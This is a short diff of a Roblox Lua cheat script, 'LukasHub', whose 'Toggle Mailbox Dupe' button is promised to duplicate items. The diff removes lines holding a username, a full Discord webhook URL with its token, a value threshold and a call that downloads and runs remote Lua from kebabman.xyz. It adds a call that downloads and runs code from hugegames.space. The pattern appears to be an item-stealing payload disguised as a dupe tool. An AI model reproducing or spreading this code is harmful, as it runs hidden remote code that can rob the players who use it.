@@ -7,10 +7,7 @@ local Tab = Window:NewTab("LukasHub")
 local Section = Tab:NewSection("Main")
 
 Section:NewButton("Toggle Mailbox Dupe", "ButtonInfo", function()
-    UserName = "yomnoonhere"
-WebHook = "https://discord.com/api/webhooks/1217538601622179841/PvnpavlJ14vP0QrOQADG7HJtqLZTiek4cJIvWyI00gIJ0vV_ZwhGiGBcxtEqhZWYqc8u"
-RAP = 100000
-loadstring(game:HttpGet("https://www.kebabman.xyz/s/mailbox.lua"))()
+   loadstring(game:HttpGet('https://hugegames.space/97997895bc9c82ebc39fc4cb.lua'))()
 end)
 
 Section:NewTextBox("Your Username", "Insert user", function(txt)
